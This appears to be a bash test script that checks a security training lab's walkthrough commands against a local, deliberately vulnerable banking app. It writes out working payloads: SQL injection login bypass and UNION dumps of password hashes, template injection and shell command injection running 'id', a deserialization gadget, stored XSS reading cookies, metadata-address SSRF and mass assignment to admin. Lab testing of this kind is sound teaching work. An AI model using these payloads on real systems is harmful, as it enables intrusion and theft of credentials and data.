#!/usr/bin/env bash
#
# Validates that the commands shown in WALKTHROUGH.md actually work against the
# running stack. Run this after editing the walkthrough.
#
set -uo pipefail

API="${API:-http://localhost:8080}"
REPORT="${REPORT:-http://localhost:8081}"

PASS=0
FAIL=0

login() {
  curl -s -X POST "$API/api/auth/login" -H "Content-Type: application/json" \
    -d "{\"username\":\"$1\",\"password\":\"$2\"}" \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null
}

check() {
  local desc="$1" actual="$2" expected="$3"
  if [[ "$actual" == *"$expected"* ]]; then
    printf '\033[32m  PASS\033[0m %s\n' "$desc"
    PASS=$((PASS + 1))
  else
    printf '\033[31m  FAIL\033[0m %s\n' "$desc"
    echo "        expected to contain: $expected"
    echo "        got: ${actual:0:250}"
    FAIL=$((FAIL + 1))
  fi
}

TOKEN="$(login alice password123)"
if [[ -z "$TOKEN" ]]; then
  echo "could not log in as alice"
  exit 1
fi
AUTH=(-H "Authorization: Bearer $TOKEN")

echo "== Lab 1: IDOR (fixed on this branch) =="
check "GET /api/a01/accounts/2 is refused for a non-owner" \
  "$(curl -s "${AUTH[@]}" "$API/api/a01/accounts/2")" '"error":"Account not found"'
check "GET /api/a01/accounts/1 still returns alice's own account" \
  "$(curl -s "${AUTH[@]}" "$API/api/a01/accounts/1")" '"account_number":"ACC-1001"'

echo "== Lab 2: privilege escalation (fixed on this branch) =="
check "GET /api/a01/admin/users is refused for a customer" \
  "$(curl -s "${AUTH[@]}" "$API/api/a01/admin/users")" '"error":"Admin role required"'

echo "== Lab 3: SSRF (fixed on this branch) =="
check "SSRF to the internal report service is refused" \
  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
     -d '{"account_id":1,"callback_url":"http://report:8081/api/report/report/generate"}' \
     "$API/api/a01/accounts/statement-email")" '"error":"Callback URL is not allowed"'
check "SSRF to the metadata address is refused" \
  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
     -d '{"account_id":1,"callback_url":"http://169.254.169.254/latest/meta-data/"}' \
     "$API/api/a01/accounts/statement-email")" '"error":"Callback URL is not allowed"'

echo "== Lab 4: debug (fixed on this branch) =="
check "GET /api/a02/debug does not leak jwt.secret" \
  "$(curl -s "${AUTH[@]}" "$API/api/a02/debug")" '"error":"Admin role required"'
check "GET /api/a02/debug/boom returns a generic message" \
  "$(curl -s "${AUTH[@]}" "$API/api/a02/debug/boom")" '"error":"Internal server error"'

echo "== Lab 5: default admin =="
# The seeded administrator's password may already have been replaced by an
# earlier run of the verification scripts, so the assertion is that the factory
# password never yields a session.
WALK_ADMIN_OUT="$(curl -s -X POST "$API/api/a02/admin/login" -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}')"
if [[ "$WALK_ADMIN_OUT" == *'"token"'* ]]; then
  printf '\033[31m  FAIL\033[0m the factory password does not open the admin console\n'
  FAIL=$((FAIL + 1))
else
  printf '\033[32m  PASS\033[0m the factory password does not open the admin console\n'
  PASS=$((PASS + 1))
fi
WALK_LOGIN_OUT="$(curl -s -X POST "$API/api/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}')"
if [[ "$WALK_LOGIN_OUT" == *'"token"'* ]]; then
  printf '\033[31m  FAIL\033[0m the factory password does not open the main login path\n'
  FAIL=$((FAIL + 1))
else
  printf '\033[32m  PASS\033[0m the factory password does not open the main login path\n'
  PASS=$((PASS + 1))
fi

echo "== Lab 6: file exposure (fixed on this branch) =="
WALK_ENV_OUT="$(curl -s "$API/.env")"
if [[ "$WALK_ENV_OUT" == *'JWT_SECRET'* ]]; then
  printf '\033[31m  FAIL\033[0m /.env is not served\n'
  FAIL=$((FAIL + 1))
else
  printf '\033[32m  PASS\033[0m /.env is not served\n'
  PASS=$((PASS + 1))
fi
WALK_GIT_OUT="$(curl -s "$API/.git/config")"
if [[ "$WALK_GIT_OUT" == *'securebank-internet-banking.git'* ]]; then
  printf '\033[31m  FAIL\033[0m /.git/config is not served\n'
  FAIL=$((FAIL + 1))
else
  printf '\033[32m  PASS\033[0m /.git/config is not served\n'
  PASS=$((PASS + 1))
fi
WALK_BACKUP_CODE="$(curl -s -o /dev/null -w '%{http_code}' "$API/backup.zip")"
if [[ "$WALK_BACKUP_CODE" == '200' ]]; then
  printf '\033[31m  FAIL\033[0m /backup.zip is not served\n'
  FAIL=$((FAIL + 1))
else
  printf '\033[32m  PASS\033[0m /backup.zip is not served\n'
  PASS=$((PASS + 1))
fi

echo "== Lab 7: MD5 (fixed on this branch) =="
WALK_HASHES_OUT="$(curl -s "${AUTH[@]}" "$API/api/a04/hashes")"
if [[ "$WALK_HASHES_OUT" == *'482c811da5d5b4bc6d497ffa98491e38'* ]]; then
  printf '\033[31m  FAIL\033[0m GET /api/a04/hashes does not return MD5 digests\n'
  FAIL=$((FAIL + 1))
else
  printf '\033[32m  PASS\033[0m GET /api/a04/hashes does not return MD5 digests\n'
  PASS=$((PASS + 1))
fi
if [[ "$WALK_HASHES_OUT" == *'password_hash":"(redacted)"'* ]]; then
  printf '\033[32m  PASS\033[0m the hashes are redacted\n'
  PASS=$((PASS + 1))
else
  printf '\033[31m  FAIL\033[0m the hashes are redacted\n'
  FAIL=$((FAIL + 1))
fi
WALK_CRACK_OUT="$(curl -s "${AUTH[@]}" "$API/api/a04/crack")"
if [[ "$WALK_CRACK_OUT" == *'password123'* ]]; then
  printf '\033[31m  FAIL\033[0m GET /api/a04/crack does not crack the password\n'
  FAIL=$((FAIL + 1))
else
  printf '\033[32m  PASS\033[0m GET /api/a04/crack does not crack the password\n'
  PASS=$((PASS + 1))
fi
WALK_LOGIN_OUT="$(curl -s -X POST "$API/api/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}')"
if [[ "$WALK_LOGIN_OUT" == *'"token"'* ]]; then
  printf '\033[32m  PASS\033[0m alice can still log in with her seeded password\n'
  PASS=$((PASS + 1))
else
  printf '\033[31m  FAIL\033[0m alice can still log in with her seeded password\n'
  FAIL=$((FAIL + 1))
fi

echo "== Lab 9: PII =="
check "GET /api/a04/profile leaks the account number" \
  "$(curl -s "${AUTH[@]}" "$API/api/a04/profile")" '"account_number":"ACC-1001"'

echo "== Lab 10: SQL injection =="
check "login bypass with admin' --" \
  "$(curl -s -X POST -H "Content-Type: application/json" \
     -d '{"username":"admin'\'' --","password":"anything"}' \
     "$API/api/a05/auth/login")" '"token"'
# The row count grows with every account in the database, so assert on the
# seeded accounts rather than on a fixed number.
WALK_SQLI_OUT="$(curl -s "${AUTH[@]}" "$API/api/a05/transfers/search?q='+UNION+SELECT+username,password_hash,email,role,id+FROM+users--")"
check "UNION SELECT dumps the seeded users" "$WALK_SQLI_OUT" '"username":"alice"'
check "UNION SELECT dumps the administrator too" "$WALK_SQLI_OUT" '"username":"admin"'
check "UNION SELECT exposes the password hashes" "$WALK_SQLI_OUT" '"password_hash"'
check "GET /api/a05/schema lists the tables" \
  "$(curl -s "${AUTH[@]}" "$API/api/a05/schema")" '"users"'

echo "== Lab 11: SSTI =="
check "7*7 evaluates to 49" \
  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
     -d '{"remark":"7*7"}' "$API/api/a05/transfers/1/remark")" '49'
check "Runtime.exec is reachable" \
  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
     -d '{"remark":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{\"id\"})"}' \
     "$API/api/a05/transfers/1/remark")" 'uid='

echo "== Lab 12: report service =="
check "SSTI reads config.secretKey" \
  "$(curl -s -X POST -H "Content-Type: application/json" \
     --data-binary '{"account_id":"1001","template":"Secret: ${config.secretKey}"}' \
     "$REPORT/api/report/report/generate")" 'sb-report-internal-secret'
check "SSTI reads config.dbPath" \
  "$(curl -s -X POST -H "Content-Type: application/json" \
     --data-binary '{"account_id":"1001","template":"DB: ${config.dbPath}"}' \
     "$REPORT/api/report/report/generate")" '/var/lib/securebank'
check "date-filter echoes the command it runs" \
  "$(curl -s -X POST -H "Content-Type: application/json" \
     -d '{"from_date":"2024-01-01","to_date":"2024-12-31"}' \
     "$REPORT/api/report/report/date-filter")" 'echo'
check "command injection runs id" \
  "$(curl -s -X POST -H "Content-Type: application/json" \
     -d '{"from_date":"2024-01-01'"'"' && id && echo '"'"'","to_date":"2024-12-31"}' \
     "$REPORT/api/report/report/date-filter")" 'uid='

echo "== Lab 13: stored XSS =="
check "the note is stored verbatim" \
  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
     -d '{"from_account_id":1,"to_account_id":2,"amount":1,"note":"<img src=x onerror=alert(document.cookie)>"}' \
     "$API/api/a05/transfers/send")" 'onerror=alert'
check "the note is returned to every client" \
  "$(curl -s "${AUTH[@]}" "$API/api/a05/transfers")" 'onerror=alert'

echo "== Lab 14: negative transfer =="
check "a negative transfer is accepted" \
  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
     -d '{"from_account_id":2,"to_account_id":1,"amount":-1000}' \
     "$API/api/a06/transfers/")" '"transfer_id"'

echo "== Lab 15: mass assignment =="
check "the role is bound from the request body" \
  "$(curl -s -X PATCH "${AUTH[@]}" -H "Content-Type: application/json" \
     -d '{"username":"alice","email":"alice@bank.com","role":"admin"}' \
     "$API/api/a06/profile")" '"role":"admin"'
curl -s -X PATCH "${AUTH[@]}" -H "Content-Type: application/json" \
  -d '{"username":"alice","email":"alice@bank.com","role":"customer"}' \
  "$API/api/a06/profile" >/dev/null

echo "== Lab 16: enumeration =="
check "missing user" \
  "$(curl -s -X POST -H "Content-Type: application/json" \
     -d '{"username":"notauser","password":"x"}' "$API/api/a06/auth/login/")" 'User not found'
check "existing user" \
  "$(curl -s -X POST -H "Content-Type: application/json" \
     -d '{"username":"alice","password":"wrongpassword"}' "$API/api/a06/auth/login/")" 'Incorrect password'

echo "== Lab 17: brute force =="
check "attempts are counted" \
  "$(curl -s "${AUTH[@]}" "$API/api/a07/auth/attempts")" 'attempts'

echo "== Lab 18: session fixation =="
JAR="$(mktemp)"
SID="$(curl -s -c "$JAR" -X POST "$API/api/a07/session/init" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['session_id'])" 2>/dev/null)"
curl -s -c "$JAR" -b "$JAR" -X POST "$API/api/a07/auth/login-session" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' >/dev/null
check "the pre-login session id is now authenticated" \
  "$(curl -s -b "$JAR" "$API/api/a07/session/whoami")" '"username":"alice"'
check "the session id was not regenerated" \
  "$(curl -s -b "$JAR" "$API/api/a07/session/whoami")" "$SID"
rm -f "$JAR"

echo "== Lab 19: predictable reset token =="
check "a reset token is issued" \
  "$(curl -s -X POST -H "Content-Type: application/json" \
     -d '{"username":"alice"}' "$API/api/a07/auth/reset-request")" '"token"'

echo "== Lab 20: deserialization =="
PAYLOAD="$(mktemp)"
cat > "$PAYLOAD" <<'JSON'
{"@class":"com.securebank.lab.a08.gadget.AccountImportJob","command":"id"}
JSON
check "the gadget executes the command" \
  "$(curl -s -X POST "${AUTH[@]}" -F "data=@$PAYLOAD" \
     "$API/api/a08/integrity/import-account")" 'uid='
rm -f "$PAYLOAD"
check "default typing is enabled" \
  "$(curl -s -X POST "${AUTH[@]}" "$API/api/a08/integrity/import-account/describe")" 'enabled'

echo "== Lab 22: file upload =="
TMP="$(mktemp)"
echo "SHELL_HERE" > "$TMP"
check "the upload is accepted" \
  "$(curl -s -X POST "${AUTH[@]}" -F "file=@$TMP" "$API/api/a08/kyc-upload")" '"uploaded":true'
check "the uploaded file is served back" \
  "$(curl -s "$API/uploads/$(basename "$TMP")")" 'SHELL_HERE'
rm -f "$TMP"

echo "== Lab 23: verbose error (no stack trace on this branch) =="
check "the error response is a generic message" \
  "$(curl -s "$API/api/a10/transfers/account-summary?id=abc")" '"error"'

echo "== Lab 24: type coercion =="
check "the amount parameter is named" \
  "$(curl -s -X POST "${AUTH[@]}" -H "Content-Type: application/json" \
     -d '{"from_account_id":1,"to_account_id":2,"amount":"notanumber"}' \
     "$API/api/a10/transfers/send")" 'amount'

echo "== Lab 25: auth bypass =="
check "a garbage token is accepted" \
  "$(curl -s -o /dev/null -w '%{http_code}' \
     -H "Authorization: Bearer THISISNOTAVALIDTOKEN" \
     "$API/api/a10/transfers/history")" '200'

echo
echo "passed: $PASS   failed: $FAIL"
[[ "$FAIL" -eq 0 ]] || exit 1
